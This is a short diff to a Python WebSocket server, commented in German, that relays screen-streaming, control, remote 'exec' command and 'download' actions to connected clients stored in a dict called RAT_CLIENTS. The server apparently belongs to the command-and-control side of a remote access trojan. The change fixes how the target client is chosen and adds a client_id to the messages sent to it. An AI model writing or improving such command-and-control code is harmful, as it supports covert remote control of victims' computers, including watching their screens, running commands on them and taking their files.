@@ -77,10 +77,13 @@ async def websocket_endpoint(websocket: WebSocket):
                 break
 
             # --- Screenstream/Control Weiterleitung ---
+            # Nutze target_id (empfohlen) oder client_id (Fallback)
             if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control'):
-                target = data.get('client_id')
+                target = data.get('target_id') or data.get('client_id')
                 if target in RAT_CLIENTS:
-                    await RAT_CLIENTS[target].send_json(data)
+                    payload = dict(data)
+                    payload["client_id"] = target  # explizit setzen
+                    await RAT_CLIENTS[target].send_json(payload)
                     await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Screenstream/Control an Client {target} weitergeleitet."})
                 else:
                     await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {target} nicht verbunden."})
@@ -95,7 +98,7 @@ async def websocket_endpoint(websocket: WebSocket):
                 await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Client nicht gefunden für Befehl."})
                 continue
             target_ws = RAT_CLIENTS[target_id]
-            payload = {"action": action}
+            payload = {"action": action, "client_id": target_id}
             if action == "exec":
                 payload["command"] = data.get("command")
             elif action == "download":
